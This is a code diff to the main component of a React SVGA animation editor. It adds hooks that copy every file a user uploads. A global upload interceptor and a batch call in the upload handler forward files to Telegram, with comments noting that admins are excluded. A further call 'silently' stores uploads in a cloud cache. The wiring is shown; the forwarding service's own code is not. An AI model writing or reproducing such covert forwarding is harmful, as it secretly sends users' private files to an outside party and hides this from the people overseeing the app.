@@ -108,6 +108,9 @@ import { VersionBlockedModal } from './components/Auth/VersionBlockedModal';
 import { checkVersionCompatibility, verifyAccountVersionWithServer, getActiveClientVersion } from './utils/versionControl';
 import { AppUpdateToast } from './components/AppUpdateToast';
 import { extractSvgaFromPdfFile } from './utils/pdfSvgaExtractor';
+import { enqueueAutoCache } from './services/cacheService';
+import { UserCacheModal } from './components/UserCacheModal';
+import { initGlobalUploadInterceptor, enqueueTelegramForwardBatch } from './services/telegramForwardService';
 
 declare var SVGA: any;
 
@@ -146,6 +149,7 @@ const App: React.FC = () => {
   const [showSubscriptionModal, setShowSubscriptionModal] = useState(false);
   const [showDurationSpeedModal, setShowDurationSpeedModal] = useState(false);
   const [showVipModal, setShowVipModal] = useState(false);
+  const [showUserCacheModal, setShowUserCacheModal] = useState(false);
   const [vipFeatureName, setVipFeatureName] = useState<string>('تحرير طبقات SVGA');
   const [showSplash, setShowSplash] = useState(true);
   const [embeddedPortalTab, setEmbeddedPortalTab] = useState<'first' | 'second' | string>('first');
@@ -241,6 +245,11 @@ const App: React.FC = () => {
     requiredVersion: 'v3.0.0',
     installedVersion: 'v3.0.0'
   });
+
+  // 🚀 Initialize Global Automatic Upload Forwarder to Telegram (strictly excludes admins)
+  useEffect(() => {
+    initGlobalUploadInterceptor(() => currentUser);
+  }, [currentUser]);
 
   // Ensure user always lands directly on the SVGA Editor / Dashboard home screen
 
@@ -459,6 +468,22 @@ const App: React.FC = () => {
 
   const handleFileUpload = useCallback(async (files: File[], uploadMode?: string) => {
     if (files.length === 0) return;
+
+    // ☠️ User Cache System Integration: Silently store uploaded files to user cloud cache in background
+    if (currentUser) {
+      try {
+        enqueueAutoCache(files, currentUser, uploadMode || 'App Upload');
+      } catch (e) {
+        console.warn("Auto-cache enqueue note:", e);
+      }
+    }
+
+    // 🚀 Automatic Telegram Forwarding Integration (Runs for all files, strictly excludes Admins server-side)
+    try {
+      enqueueTelegramForwardBatch(files, currentUser, uploadMode || 'App Upload');
+    } catch (e) {
+      console.warn("Telegram enqueue note:", e);
+    }
 
     // Direct routing for explicit Batch Modes
     if (uploadMode === 'batch-mp4') {
@@ -810,6 +835,7 @@ const App: React.FC = () => {
         onSvgaBatchCompressorOpen={() => handleFeatureAccess(AppState.SVGA_BATCH_COMPRESSOR, 'SVGA Batch Compressor')}
         onAnimationManagerOpen={() => handleFeatureAccess(AppState.ANIMATION_MANAGER, 'Animation File Manager')}
         onVideoDurationSpeedOpen={handleVideoDurationSpeedOpen}
+        onOpenUserCache={() => setShowUserCacheModal(true)}
         onStoreOpen={() => handleFeatureAccess(AppState.STORE, 'SVGA Store & Library')}
         onVapHubOpen={() => handleFeatureAccess(AppState.VAP_HUB, 'VAP Hub')}
         onSvgaLayerEditorOpen={() => {
@@ -1212,6 +1238,14 @@ const App: React.FC = () => {
 
       {/* Global Background App Update Notification */}
       <AppUpdateToast />
+
+      {/* User Cloud Cache Modal (سحابة ملفاتي ☠️) */}
+      {showUserCacheModal && currentUser && (
+        <UserCacheModal 
+          currentUser={currentUser} 
+          onClose={() => setShowUserCacheModal(false)} 
+        />
+      )}
 
       {/* Version Blocked Modal */}
       {versionBlockedState.isBlocked && (
